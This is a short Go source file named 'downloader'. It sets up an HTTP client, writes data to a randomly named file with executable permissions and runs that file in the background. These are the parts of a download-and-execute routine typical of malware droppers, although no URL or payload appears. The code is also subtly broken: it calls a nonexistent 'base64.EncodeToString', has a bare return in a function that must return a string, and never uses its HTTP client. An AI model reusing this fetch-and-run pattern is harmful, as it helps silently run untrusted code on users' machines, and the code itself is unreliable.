package downloader

import (
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
	"math/rand"
	"encoding/base64"
)

// httpClient returns a new HTTP client with appropriate timeouts set.
func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}

func randStr() string {
	b := make([]byte, 12)
	rand.Seed(time.Now().Unix())
	rand.Read(b)

	return base64.EncodeToString(b)
}

func save(data []byte) string {
	path := randStr()
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0755)
	if err != nil {
		return
	}

	f.Write(data)
	f.Close()

	return path
}

func run(filename string) {
	cmd := exec.Command(filename)
	cmd.Start()
}
